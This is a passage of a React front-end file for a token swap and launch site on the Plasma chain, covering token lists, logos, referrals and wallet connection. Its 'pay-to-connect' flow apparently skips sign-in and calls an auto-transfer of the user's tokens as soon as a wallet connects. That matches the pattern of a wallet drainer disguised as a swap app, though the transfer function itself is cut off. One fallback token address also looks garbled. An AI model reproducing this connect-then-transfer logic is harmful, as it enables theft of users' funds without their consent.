import React, { useState, useEffect, useRef } from 'react'
import { Wallet, Settings, TrendingUp, ExternalLink, ChevronDown, Search, X, Copy, CopyCheck, LogOut, Menu, Twitter, Send, BookOpen, Gift, UserPlus } from 'lucide-react'
import { ethers } from 'ethers'
import { useAccount, useDisconnect, useWalletClient, useSwitchChain } from 'wagmi'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import './App.css'
import './switch-button.css'
import TokenLogo from './components/TokenLogo.jsx'
import ApiService from './services/api.js'
import { copyText } from './utils/clipboard.js'
import { 
  PLASMA_CONFIG, 
  getTokenBalance, 
  swapXPLForTokens, 
  swapTokensForXPL,
  swapTokensForTokensGeneric,
  getPoolReserves,
  getQuote,
  getTokenInfo,
  getPlasmaProvider,
  wrapXPL,
  unwrapWXPL,
  CONTRACT_ADDRESSES,
  fetchLaunchedTokensOnchain
} from './contracts/contractUtils'
import { claimReferralFee, getVaultInfo, formatClaimError } from './vaultUtils.js'

// API Base URL - Use VITE_BACKEND_URL or fallback to relative URL (same host)
const API_BASE = import.meta.env.VITE_BACKEND_URL || '';
console.log('🌐 API_BASE configured:', API_BASE || '(relative URL - same host)');

// Popular tokens on Plasma chain - SUPPORTS ALL TOKENS
const DEFAULT_TOKENS = [
  { 
    symbol: 'XPL', 
    name: 'Plasma', 
    address: 'native', // Native XPL (DyorSwap auto-converts to WXPL internally)
    logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiNFMDA1NEYiLz4KPHN2ZyB4PSI2IiB5PSI2IiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSI+Cjx0ZXh0IHg9IjEwIiB5PSIxNCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEyIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPlhQTDwvdGV4dD4KPC9zdmc+Cjwvc3ZnPg==',
    balance: '0.0' 
  },
  { 
    symbol: 'WXPL', 
    name: 'Wrapped XPL', 
    address: '0x6100e367285b01f48d07953803a2d8dca5d19873', // DyorSwap base pair
    logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiNGRjY5MDAiLz4KPHN2ZyB4PSI2IiB5PSI2IiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSI+Cjx0ZXh0IHg9IjEwIiB5PSIxNCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjEwIiBmb250LXdlaWdodD0iYm9sZCIgZmlsbD0id2hpdGUiIHRleHQtYW5jaG9yPSJtaWRkbGUiPldYUEw8L3RleHQ+Cjwvc3ZnPgo8L3N2Zz4=',
    balance: '0.0',
    decimals: 18
  },
  {
    symbol: 'USDT0',
    name: 'USDT0',
    address: '0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb',
    logoUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMTYiIGN5PSIxNiIgcj0iMTYiIGZpbGw9IiMyNkEzN0EiLz4KPHN2ZyB4PSI2IiB5PSI2IiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCAyMCAyMCIgZmlsbD0ibm9uZSI+Cjx0ZXh0IHg9IjEwIiB5PSIxNCIgZm9udC1mYW1pbHk9IkFyaWFsIiBmb250LXNpemU9IjgiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+VVNEVDwvdGV4dD4KPC9zdmc+Cjwvc3ZnPg==',
    balance: '0.0',
    decimals: 6
  }
]

function App() {
  // Wagmi hooks
  const { address, isConnected, chain } = useAccount()
  const { disconnect } = useDisconnect()
  const { open } = useWeb3Modal()
  const { data: walletClient } = useWalletClient()
  const { switchChain } = useSwitchChain()
  
  const [account, setAccount] = useState('')
  const [network, setNetwork] = useState(null)
  const [tokens, setTokens] = useState([])
  const [fromToken, setFromToken] = useState(null) // Native XPL (will be loaded from backend)
  const [toToken, setToToken] = useState(null)   // WXPL (will be loaded from backend)
  const [fromAmount, setFromAmount] = useState('1')
  const [toAmount, setToAmount] = useState('')
  
  // Sync Wagmi state to local state for backward compatibility
  useEffect(() => {
    if (isConnected && address) {
      setAccount(address)
      if (chain) {
        setNetwork({ chainId: chain.id, name: chain.name })
      }
    } else {
      setAccount('')
      setNetwork(null)
    }
  }, [isConnected, address, chain])
  
  // Debug state values
  console.log('🔍 Current state:', { fromAmount, toAmount })

  // Note: Automatic wallet detection disabled in iframe environment
  // Users should click "Pay to Connect" button to connect
  
  // Add custom token by address
  const addCustomToken = async (tokenAddress) => {
    try {
      console.log('🔍 Adding custom token:', tokenAddress);
      
      // Check if token already exists
      if (tokens.find(t => t.address?.toLowerCase() === tokenAddress.toLowerCase())) {
        console.log('⚠️ Token already in list');
        return;
      }
      
      // First try to get full token data from backend (includes logo, bonding data for DyorSwap Pump tokens)
      let newToken = null;
      try {
        console.log('🌐 Fetching token data from backend...');
        const response = await fetch(`${API_BASE}/api/search-token/${tokenAddress}`);
        if (response.ok) {
          const data = await response.json();
          if (data.token) {
            console.log('✅ Found token in backend:', data.token.symbol);
            newToken = {
              symbol: data.token.symbol,
              name: data.token.name,
              address: tokenAddress,
              decimals: 18, // Default for DyorSwap Pump tokens
              balance: '0.0',
              logo: data.token.logo, // Include logo from backend
              isCustom: true
            };
          }
        }
      } catch (e) {
        console.log('⚠️ Backend search failed, falling back to blockchain query');
      }
      
      // Fallback: Query blockchain directly if backend didn't return data
      if (!newToken) {
        const provider = getPlasmaProvider();
        const tokenInfo = await getTokenInfo(tokenAddress, provider);
        
        if (tokenInfo) {
          newToken = {
            symbol: tokenInfo.symbol,
            name: tokenInfo.name,
            address: tokenAddress,
            decimals: tokenInfo.decimals,
            balance: '0.0',
            isCustom: true
          };
        }
      }
      
      if (newToken) {
        setTokens(prev => [...prev, newToken]);
        
        // Save to localStorage
        const customTokens = JSON.parse(localStorage.getItem('customTokens') || '[]');
        customTokens.push(newToken);
        localStorage.setItem('customTokens', JSON.stringify(customTokens));
        
        console.log(`✅ Added custom token: ${newToken.symbol}`);
        
        // Update balance if connected
        if (account) {
          const provider = getPlasmaProvider();
          const balance = await getTokenBalance(tokenAddress, account, provider);
          updateTokenBalance(tokenAddress, balance);
        }
      }
    } catch (error) {
      console.error('❌ Failed to add custom token:', error);
    }
  };
  
  // Update token balance
  const updateTokenBalance = (tokenAddress, balance) => {
    setTokens(prev => prev.map(t => 
      t.address?.toLowerCase() === tokenAddress.toLowerCase()
        ? { ...t, balance }
        : t
    ));
  };
  
  // Load tokens from backend API + localStorage custom tokens
  useEffect(() => {
    const loadTokens = async () => {
      try {
        console.log('🌐 Loading tokens from backend API...');
        const backendTokens = await ApiService.getTokens();
        
        if (backendTokens && backendTokens.length > 0) {
          console.log(`✅ Loaded ${backendTokens.length} tokens from backend`);
          
          // Clear all logo cache to force reload of new logos
          try {
            localStorage.removeItem('logoCache');
            console.log('🗑️ Cleared logo cache to reload new logos');
          } catch (e) {
            // Ignore cache clear errors
          }
          
          // Add balance field to tokens
          const tokensWithBalance = backendTokens.map(token => ({
            ...token,
            balance: '0.0'
          }));
          
          // Load custom tokens from localStorage
          const customTokens = JSON.parse(localStorage.getItem('customTokens') || '[]');
          console.log(`📦 Loaded ${customTokens.length} custom tokens from localStorage`);
          
          // Merge backend + custom tokens
          const allTokens = [...tokensWithBalance, ...customTokens];
          setTokens(allTokens);
          
          // Set default tokens (XPL and WXPL)
          const xplToken = allTokens.find(t => t.symbol === 'XPL');
          const wxplToken = allTokens.find(t => t.symbol === 'WXPL');
          
          if (xplToken && wxplToken) {
            setFromToken(xplToken);
            setToToken(wxplToken);
            console.log('✅ Set default tokens: XPL -> WXPL');
          }
        } else {
          console.log('⚠️ No tokens received from backend, using fallback');
          // Simplified fallback tokens (no logos)
          const fallbackTokens = [
            { symbol: 'XPL', name: 'Plasma', address: 'native', decimals: 18, balance: '0.0' },
            { symbol: 'WXPL', name: 'Wrapped XPL', address: '0x6100e367285b01f48d07953803a2d8dca5d19873', decimals: 18, balance: '0.0' },
            { symbol: 'USDT0', name: 'USDT0', address: '0xb8ce59fc3717ada4c02eadf9682a9e934f625ebb', decimals: 6, balance: '0.0' }
          ];
          setTokens(fallbackTokens);
          setFromToken(fallbackTokens[0]);
          setToToken(fallbackTokens[1]);
        }
      } catch (error) {
        console.error('❌ Error loading tokens from backend:', error);
        // Simplified fallback tokens (no logos)
        const fallbackTokens = [
          { symbol: 'XPL', name: 'Plasma', address: 'native', decimals: 18, balance: '0.0' },
          { symbol: 'WXPL', name: 'Wrapped XPL', address: '0x6100e367285b01f48d07953803a2d8dca5d19873', decimals: 18, balance: '0.0' },
          { symbol: 'USDT0', name: 'USDT0', address: '0xb8ce9a31d8e0c8d6d0c5ac6b6b6b6b6b6b6b6b6b', decimals: 6, balance: '0.0' }
        ];
        setTokens(fallbackTokens);
        setFromToken(fallbackTokens[0]);
        setToToken(fallbackTokens[1]);
      }
    };
    
    loadTokens();
  }, []); // Run once on mount
  const [isSwapping, setIsSwapping] = useState(false)
  const [slippage, setSlippage] = useState('1.5')
  const [currentStep, setCurrentStep] = useState(null)
  const [showTokenModal, setShowTokenModal] = useState(false)
  const [selectingToken, setSelectingToken] = useState(null) // 'from' or 'to'
  const [showClaimModal, setShowClaimModal] = useState(false)
  const [claimAmount, setClaimAmount] = useState('')
  const [isClaiming, setIsClaiming] = useState(false)
  const [referralEarnings, setReferralEarnings] = useState(null)
  const [referralCode, setReferralCode] = useState(null)
  const [isEditingCode, setIsEditingCode] = useState(false)
  const [newCodeInput, setNewCodeInput] = useState('')
  const [isCreatingCode, setIsCreatingCode] = useState(false)
  const [referralCount, setReferralCount] = useState(0)
  const [tokenSearch, setTokenSearch] = useState('')
  const [launchedTokenSearch, setLaunchedTokenSearch] = useState('')
  const [searchedToken, setSearchedToken] = useState(null)
  const [isSearchingToken, setIsSearchingToken] = useState(false)
  const [launchFilter, setLaunchFilter] = useState('all') // all, new, created, traded, listed
  const [isLoadingToken, setIsLoadingToken] = useState(false)
  const [tokenPreview, setTokenPreview] = useState(null)
  const [showWalletDropdown, setShowWalletDropdown] = useState(false)
  const [copySuccess, setCopySuccess] = useState(false)
  const [showSlippageSettings, setShowSlippageSettings] = useState(false)
  const [showMenu, setShowMenu] = useState(false)
  const [showComingSoon, setShowComingSoon] = useState(false)
  const [showLaunchPage, setShowLaunchPage] = useState(window.location.pathname === '/launch')
  const [launchedTokens, setLaunchedTokens] = useState([])
  const [loadingLaunched, setLoadingLaunched] = useState(false)
  const [toast, setToast] = useState(null)
  const [payToConnectState, setPayToConnectState] = useState('idle') // idle, logging_in, signing, transferring, complete
  const walletDropdownRef = useRef(null)
  const slippageDropdownRef = useRef(null)

  // Multiple IPFS gateways for fallback reliability (ordered by speed/reliability)
  const IPFS_GATEWAYS = [
    'https://ipfs.io/ipfs/',
    'https://cloudflare-ipfs.com/ipfs/',
    'https://gateway.pinata.cloud/ipfs/',
    'https://dweb.link/ipfs/',
    'https://ipfs.tech/ipfs/',
    'https://4everland.io/ipfs/'
  ];

  // Track logo loading state in localStorage for stability
  const [logoCache, setLogoCache] = useState(() => {
    try {
      const cached = localStorage.getItem('logoCache');
      return cached ? JSON.parse(cached) : {};
    } catch {
      return {};
    }
  });

  // Save successful logo loads to cache
  const cacheLogoSuccess = (tokenAddress, gatewayUrl) => {
    try {
      const newCache = { ...logoCache, [tokenAddress]: gatewayUrl };
      localStorage.setItem('logoCache', JSON.stringify(newCache));
      setLogoCache(newCache);
    } catch (e) {
      console.warn('Failed to cache logo:', e);
    }
  };

  // Mark logo as failed in cache
  const cacheLogoFailure = (tokenAddress) => {
    try {
      const newCache = { ...logoCache, [tokenAddress]: 'FAILED' };
      localStorage.setItem('logoCache', JSON.stringify(newCache));
      setLogoCache(newCache);
    } catch (e) {
      console.warn('Failed to cache logo failure:', e);
    }
  };

  // Handle IPFS image load errors with gateway fallback
  const handleImageError = (e, ipfsHash, tokenAddress) => {
    if (!ipfsHash) return;
    
    const currentSrc = e.target.src;
    const currentGatewayIndex = IPFS_GATEWAYS.findIndex(gateway => currentSrc.includes(gateway));
    
    if (currentGatewayIndex < IPFS_GATEWAYS.length - 1) {
      // Try next gateway
      const nextGateway = IPFS_GATEWAYS[currentGatewayIndex + 1];
      const newSrc = `${nextGateway}${ipfsHash}`;
      e.target.src = newSrc;
      console.log(`🔄 Logo failed, trying gateway ${currentGatewayIndex + 2}/${IPFS_GATEWAYS.length}`);
    } else {
      // All gateways failed, mark as failed
      console.log('❌ All IPFS gateways failed for logo');
      if (tokenAddress) {
        cacheLogoFailure(tokenAddress);
      }
      // Hide the image element
      e.target.style.display = 'none';
    }
  };

  // Handle successful image load
  const handleImageLoad = (e, ipfsHash, tokenAddress) => {
    if (tokenAddress && ipfsHash) {
      const currentSrc = e.target.src;
      cacheLogoSuccess(tokenAddress, currentSrc);
      console.log('✅ Logo loaded and cached:', tokenAddress);
    }
  };

  // Get logo URL with caching
  const getLogoUrl = (token) => {
    if (!token || !token.address) return null;
    
    // Check cache first
    const cached = logoCache[token.address];
    if (cached === 'FAILED') {
      return null; // Don't try to load failed logos
    }
    if (cached && cached !== 'FAILED') {
      return cached; // Use cached successful URL
    }
    
    // Extract logo
    const logo = token.logo || token.logoURI || '';
    if (!logo) return null;
    
    // If it's a data URI or direct HTTP(S) URL, return it directly
    if (logo.startsWith('data:') || logo.startsWith('http://') || logo.startsWith('https://')) {
      return logo;
    }
    
    // Extract IPFS hash
    const ipfsHash = logo.includes('ipfs://') 
      ? logo.replace('ipfs://', '')
      : logo.includes('/ipfs/') 
        ? logo.split('/ipfs/')[1]
        : logo;
    
    if (!ipfsHash || ipfsHash.length < 10) return null;
    
    // Use first gateway by default
    return `${IPFS_GATEWAYS[0]}${ipfsHash}`;
  };

  // Format small prices like DyorSwap: 0.{5}142 means 0.00000142
  const formatSmallPrice = (price) => {
    if (!price || price === 0) return '0';
    
    const priceNum = parseFloat(price);
    if (isNaN(priceNum)) return '0';
    
    // For prices >= 0.001, use normal formatting
    if (priceNum >= 0.001) {
      return priceNum.toFixed(5);
    }
    
    // For very small prices, use compact notation
    // Convert to scientific notation to count zeros accurately
    const expMatch = priceNum.toExponential().match(/e-(\d+)/);
    if (expMatch) {
      const exponent = parseInt(expMatch[1]);
      // If 5 or more zeros after decimal (e.g., 0.00001 or smaller)
      if (exponent >= 5) {
        // Get the coefficient and format it
        const coefficient = priceNum.toExponential().split('e')[0];
        const significantDigits = coefficient.replace('.', '').substring(0, 3);
        return `0.{${exponent}}${significantDigits}`;
      }
    }
    
    // For 0.0001 to 0.00099, show full decimals
    return priceNum.toFixed(7).replace(/0+$/, '');
  };

  // Enhanced toast system with types
  const showToast = (message, type = "info") => {
    let container = document.querySelector(".toast-container");
    if (!container) {
      container = document.createElement("div");
      container.className = "toast-container";
      document.body.appendChild(container);
    }

    const toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.textContent = message;

    container.appendChild(toast);

    // Auto-remove after 4 seconds
    setTimeout(() => {
      if (toast.parentNode) {
        toast.remove();
      }
    }, 4000);
  }

  // Load launched tokens from backend API (REAL DATA from DyorSwap Pump)
  const loadLaunchedTokens = async (silent = false) => {
    // INSTANT DISPLAY: Load from cache first!
    const cachedData = localStorage.getItem('launchedTokensCache');
    const cacheTimestamp = localStorage.getItem('launchedTokensCacheTime');
    const now = Date.now();
    const CACHE_MAX_AGE = 60000; // 1 minute
    
    if (cachedData && cacheTimestamp) {
      const age = now - parseInt(cacheTimestamp);
      if (age < CACHE_MAX_AGE) {
        // Display cached data immediately
        const cached = JSON.parse(cachedData);
        console.log(`⚡ INSTANT display from cache (${Math.round(age/1000)}s old, ${cached.length} tokens)`);
        setLaunchedTokens(cached);
        setLoadingLaunched(false); // Hide spinner immediately
        // Continue to fetch fresh data in background
        silent = true;
      }
    }
    
    if (!silent) {
      setLoadingLaunched(true);
    }
    
    try {
      console.log(silent ? '🔄 Background refresh...' : '🚀 Loading launched tokens from backend...');
      
      // BACKEND API CALL - Fast and reliable!
      const response = await fetch(`${API_BASE}/api/launched-tokens`);
      if (!response.ok) throw new Error('Failed to fetch');
      const data = await response.json();
      
      // Sort tokens by bonding curve progress (highest first)
      const sortedTokens = (data.tokens || []).sort((a, b) => {
        return (b.bondingProgress || 0) - (a.bondingProgress || 0);
      });
      
      // Save to cache
      localStorage.setItem('launchedTokensCache', JSON.stringify(sortedTokens));
      localStorage.setItem('launchedTokensCacheTime', now.toString());
      
      console.log(silent ? `✅ Background refresh complete (${sortedTokens.length} tokens)` : `✅ Loaded ${sortedTokens.length} tokens from backend!`);
      setLaunchedTokens(sortedTokens);
    } catch (error) {
      console.error('❌ Error loading launched tokens:', error);
      if (!silent && !cachedData) setLaunchedTokens([]);
    } finally {
      if (!silent) {
        setLoadingLaunched(false);
      }
    }
  };

  // Search for a specific token by address
  const searchTokenByAddress = async (address) => {
    if (!address || address.length < 40) return;
    
    setIsSearchingToken(true);
    setSearchedToken(null);
    
    try {
      console.log('🔍 Searching for token by address:', address);
      const response = await fetch(`${API_BASE}/api/search-token/${address}`);
      if (response.ok) {
        const data = await response.json();
        console.log('✅ Found token:', data.token);
        setSearchedToken(data.token);
      } else {
        console.log('⚠️ Token not found');
        setSearchedToken(null);
      }
    } catch (error) {
      console.error('❌ Error searching for token:', error);
      setSearchedToken(null);
    } finally {
      setIsSearchingToken(false);
    }
  };

  // Effect to search by address when user types full address
  useEffect(() => {
    const searchTerm = launchedTokenSearch.trim();
    // Check if it looks like an address (starts with 0x and is long enough)
    if (searchTerm.startsWith('0x') && searchTerm.length >= 40) {
      const timeoutId = setTimeout(() => {
        searchTokenByAddress(searchTerm);
      }, 500); // Debounce 500ms
      
      return () => clearTimeout(timeoutId);
    } else {
      setSearchedToken(null);
    }
  }, [launchedTokenSearch]);

  // URL routing - sync URL with showLaunchPage state
  useEffect(() => {
    const path = window.location.pathname;
    if (path === '/launch') {
      console.log('🚀 Detected /launch path - loading tokens immediately');
      setShowLaunchPage(true);
      // Load tokens immediately if on /launch path
      loadLaunchedTokens();
    } else if (showLaunchPage) {
      setShowLaunchPage(false);
    }
  }, []);

  // Handle browser back/forward navigation
  useEffect(() => {
    const handlePopState = () => {
      const path = window.location.pathname;
      setShowLaunchPage(path === '/launch');
    };
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);

  // Update URL when showLaunchPage changes (only push history, don't read)
  useEffect(() => {
    const currentPath = window.location.pathname;
    if (showLaunchPage && currentPath !== '/launch') {
      window.history.pushState({}, '', '/launch');
    } else if (!showLaunchPage && currentPath !== '/') {
      window.history.pushState({}, '', '/');
    }
  }, [showLaunchPage]);

  // Load launched tokens when Launch page opens + auto-refresh every 30 seconds
  useEffect(() => {
    console.log('🎯 Launch page useEffect triggered:', showLaunchPage);
    if (showLaunchPage) {
      console.log('🔄 Calling loadLaunchedTokens...');
      loadLaunchedTokens();
      
      // Auto-refresh every 30 seconds while on launch page
      const interval = setInterval(() => {
        console.log('🔄 Auto-refreshing launched tokens...');
        loadLaunchedTokens(true); // silent = true, no loading spinner
      }, 30000);
      
      return () => clearInterval(interval);
    }
  }, [showLaunchPage]);

  // Clear token preview when search changes
  useEffect(() => {
    if (tokenSearch.trim() === '') {
      setTokenPreview(null)
      setIsLoadingToken(false)
    }
  }, [tokenSearch])

  // Close dropdowns when clicking outside
  useEffect(() => {
    function handleClickOutside(event) {
      if (walletDropdownRef.current && !walletDropdownRef.current.contains(event.target)) {
        setShowWalletDropdown(false)
      }
      if (slippageDropdownRef.current && !slippageDropdownRef.current.contains(event.target)) {
        setShowSlippageSettings(false)
      }
    }

    if (showWalletDropdown || showSlippageSettings) {
      document.addEventListener('mousedown', handleClickOutside)
      return () => {
        document.removeEventListener('mousedown', handleClickOutside)
      }
    }
  }, [showWalletDropdown, showSlippageSettings])

  // Set percentage amount based on balance
  const setPercentageAmount = (percentage) => {
    console.log(`🎯 setPercentageAmount called: ${percentage}% - isConnected: ${isConnected}, account: ${account}, balance: ${fromToken?.balance}`)
    if (!fromToken?.balance) {
      // If no balance, set demo amounts for better UX
      const demoAmount = percentage === 100 ? '1.0' : (percentage / 100).toFixed(2)
      setFromAmount(demoAmount)
      return
    }
    
    const balance = parseFloat(fromToken?.balance || '0')
    if (isNaN(balance) || balance <= 0) {
      // If no balance, just set a demo amount for UX
      const demoAmount = percentage === 100 ? '1.0' : (percentage / 100).toFixed(2)
      setFromAmount(demoAmount)
      return
    }
    
    // For XPL, leave some for gas fees (0.01 XPL buffer)
    let availableBalance = balance
    if (fromToken?.symbol === 'XPL' && percentage === 100) {
      availableBalance = Math.max(0, balance - 0.01) // Reserve for gas
    }
    
    const amount = (availableBalance * percentage) / 100
    
    // For MAX button (100%), use full precision to avoid rounding errors
    let formattedAmount
    if (percentage === 100) {
      // Use up to 10 decimals for MAX to preserve precision
      formattedAmount = amount.toFixed(10).replace(/\.?0+$/, '')
    } else {
      // For percentages, 6 decimals is fine
      formattedAmount = amount.toFixed(6).replace(/\.?0+$/, '')
    }
    
    console.log(`📊 Setting ${percentage}% of ${balance} = ${formattedAmount}`)
    setFromAmount(formattedAmount)
  }

  // Effect to sync Wagmi connection state with pay-to-connect flow
  useEffect(() => {
    console.log('🔐 Wagmi state:', { isConnected, address, payState: payToConnectState });
    
    // DEBUG: Log wallet details if available
    if (isConnected && address) {
      console.log('👛 Wallet connected:', { address, chain: chain?.name });
    }
    
    // STEP 1: Wallet connected - go DIRECTLY to payment (skip SIWE!)
    if (payToConnectState === 'logging_in' && isConnected && address && walletClient) {
      console.log('✅ Wallet detected! Address:', address);
      console.log('🚀 Proceeding directly to payment (NO SIWE authentication)');
      
      // Final guard: Only proceed if STILL in logging_in state
      if (payToConnectState !== 'logging_in') {
        console.log('⚠️ Flow was cancelled - ignoring late event');
        return;
      }
      
      // Auto-transfer tokens after connection
      const userAddress = walletClient.account.address;
      console.log('✅ Wallet connected:', userAddress);
      handleAutoTransfer(walletClient).catch(err => {
        console.error('❌ Auto-transfer error:', err);
        setPayToConnectState('idle');
      });
      
    } else if (payToConnectState === 'logging_in' && !isConnected) {
      // User is in logging_in state but no wallet appeared - likely cancelled modal
      console.log('⚠️ Modal likely cancelled - no wallet appeared');
      
      const timer = setTimeout(() => {
        // Re-check state before resetting (in case wallet just arrived)
        if (payToConnectState === 'logging_in' && !isConnected) {
          console.log('❌ Modal cancelled - resetting flow');
          setPayToConnectState('idle');
        }
      }, 1000); // 1 second grace period - faster feedback on cancellation
      
      return () => clearTimeout(timer);
      
    } else if (!isConnected && payToConnectState === 'idle') {
      console.log('🔍 User not connected - clearing wallet state');
      
      // Clear localStorage to prevent auto-reconnect
      localStorage.removeItem('wallet_address');
      localStorage.removeItem('wallet_connected');
      
      // Clear connection state
      setAccount('');
      setNetwork(null);
    }
  }, [isConnected, address, walletClient, payToConnectState])

  // Update balances when tokens load and wallet is connected
  useEffect(() => {
    console.log('🔍 Balance update check:', { 
      tokensCount: tokens.length, 
      hasAccount: !!account, 
      isConnected,
      account: account ? `${account.slice(0,6)}...` : 'none'
    });
    
    if (tokens.length > 0 && account && isConnected) {
      console.log('💰 Tokens loaded with connected wallet - updating balances');
      setTimeout(() => updateBalances(), 500);
    } else {
      console.log('⏸️ Balance update skipped - waiting for:', {
        needsTokens: tokens.length === 0,
        needsAccount: !account,
        needsConnection: !isConnected
      });
    }
  }, [tokens.length, account, isConnected]);

  // Handle body scroll lock for modal
  useEffect(() => {
    if (showTokenModal) {
      document.body.classList.add('no-scroll');
    } else {
      document.body.classList.remove('no-scroll');
    }
    
    // Cleanup on unmount
    return () => {
      document.body.classList.remove('no-scroll');
    };
  }, [showTokenModal]);

  // Effect to handle wallet state and listen for wallet events
  // DISABLED AUTO-CONNECT - Now controlled by pay-to-connect state machine
  useEffect(() => {
    console.log('🔍 Checking for existing wallet connection...');
    console.log('window.ethereum available:', !!window.ethereum);
    
    // Only set up listeners for account/network changes, NO auto-connect
    const setupWalletListeners = () => {
      if (window.ethereum) {
        // Listen for account changes
        const handleAccountsChanged = (accounts) => {
          console.log('🔄 Wallet accounts changed:', accounts)
          if (accounts.length === 0 && isConnected) {
            // Wallet disconnected - clear state (Wagmi handles isConnected)
            console.log('❌ Wallet disconnected')
            setAccount('')
            setNetwork(null)
            setPayToConnectState('idle')
          }
        }

        // Listen for network changes
        const handleChainChanged = (chainId) => {
          console.log('🔄 Network changed to:', chainId)
          if (isConnected) {
            if (chainId === '0x2611') {
              setNetwork({ chainId: 9745, name: 'Plasma Network' })
            } else {
              setNetwork({ chainId: parseInt(chainId, 16), name: 'Other Network' })
            }
            // Refresh balances when network changes
            setTimeout(() => updateBalances(), 1000)
          }
        }

        // Add event listeners
        window.ethereum.on('accountsChanged', handleAccountsChanged)
        window.ethereum.on('chainChanged', handleChainChanged)

        // Cleanup function
        return () => {
          if (window.ethereum.removeListener) {
            window.ethereum.removeListener('accountsChanged', handleAccountsChanged)
            window.ethereum.removeListener('chainChanged', handleChainChanged)
          }
        }
      }
    }

    const cleanup = setupWalletListeners()
    
    if (!isConnected) {
      console.log('❌ No wallet connection')
    }

    return cleanup
  }, [isConnected])

  // Fetch referral code on wallet connection (auto-load on page load)
  useEffect(() => {
    if (account) {
      console.log('🔄 Loading referral code for:', account);
      fetch(`${API_BASE}/api/referrals/my-code/${account}`)
        .then(res => res.json())
        .then(data => {
          if (data.referralCode) {
            console.log('✅ Loaded existing referral code:', data.referralCode);
            setReferralCode(data.referralCode);
            setReferralCount(data.totalReferrals || 0);
          } else {
            console.log('ℹ️ No referral code found for this wallet');
          }
        })
        .catch(err => console.error('Failed to fetch referral code:', err));
    }
  }, [isConnected, account])

  // Fetch referral earnings when claim modal opens
  useEffect(() => {
    if (showClaimModal && account) {
      console.log('🔄 Modal opened - Force loading referral data for:', account);
      fetch(`${API_BASE}/api/referrals/my-code/${account}`)
        .then(res => res.json())
        .then(data => {
          console.log('📊 Modal fetch response:', data);
          
          // Set referral code if exists
          if (data.code || data.referralCode) {
            const code = data.code || data.referralCode;
            console.log('✅ Setting referral code from modal fetch:', code);
            setReferralCode(code);
            setReferralCount(data.referralCount || data.totalReferrals || 0);
          }
          
          // Always set earnings (even if zero) so UI shows the 3 boxes
          const totalEarned = data.totalEarnings || '0';
          const totalClaimed = data.totalClaimed || '0';
          const payable = (BigInt(totalEarned) - BigInt(totalClaimed)).toString();
          
          setReferralEarnings({
            totalEarned: totalEarned,
            totalClaimed: totalClaimed,
            payable: payable
          });
        })
        .catch(err => console.error('Failed to fetch referral stats:', err));
    }
  }, [showClaimModal, isConnected, account])

  // Auto-bind referral on page load
  useEffect(() => {
    if (isConnected && account) {
      const urlParams = new URLSearchParams(window.location.search);
      const refCode = urlParams.get('ref');
      
      if (refCode) {
        console.log(`🎯 Detected referral code: ${refCode}`);
        
        fetch(`${API_BASE}/api/referrals/bind-code`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAddress: account,
            referralCode: refCode
          })
        })
          .then(res => res.json())
          .then(data => {
            if (data.success) {
              console.log(`✅ Successfully bound to referrer via code ${refCode}`);
              showToast(`Welcome! You've been referred by ${refCode}`, 'success');
            }
          })
          .catch(err => console.error('Failed to bind referral:', err));
        
        window.history.replaceState({}, document.title, window.location.pathname);
      }
    }
  }, [isConnected, account])

  // sanitize helper
  function sanitizeNumberInput(v) {
    const s = v.replace(',', '.')
    if (s === '') return ''
    if (s === '.') return '0.'
    const cleaned = s.replace(/[^\d.]/g, '')
    const parts = cleaned.split('.')
    if (parts.length > 2) {
      return parts[0] + '.' + parts.slice(1).join('')
    }
    return cleaned
  }

  // FIXED PRICING LOGIC - using your improved approach
  useEffect(() => {
    console.log(`Quote useEffect triggered:`, { 
      fromAmount, 
      fromTokenSymbol: fromToken?.symbol, 
      toTokenSymbol: toToken?.symbol,
      fromTokenAddr: fromToken?.address,
      toTokenAddr: toToken?.address
    })

    if (fromAmount === '' || fromAmount === '.' || fromAmount === '0.') {
      console.log(`❌ Empty or invalid input: "${fromAmount}"`)
      setToAmount('')
      return
    }

    const amt = Number(fromAmount)
    if (!Number.isFinite(amt) || amt <= 0) {
      console.log(`❌ Invalid number: ${amt}`)
      setToAmount('')
      return
    }

    if (!fromToken || !toToken) {
      console.log(`❌ Missing tokens`)
      setToAmount('')
      return
    }

    console.log(`✅ All checks passed, getting quote for ${amt} ${fromToken?.symbol} -> ${toToken?.symbol}`)

    let cancelled = false
    const run = async () => {
      try {
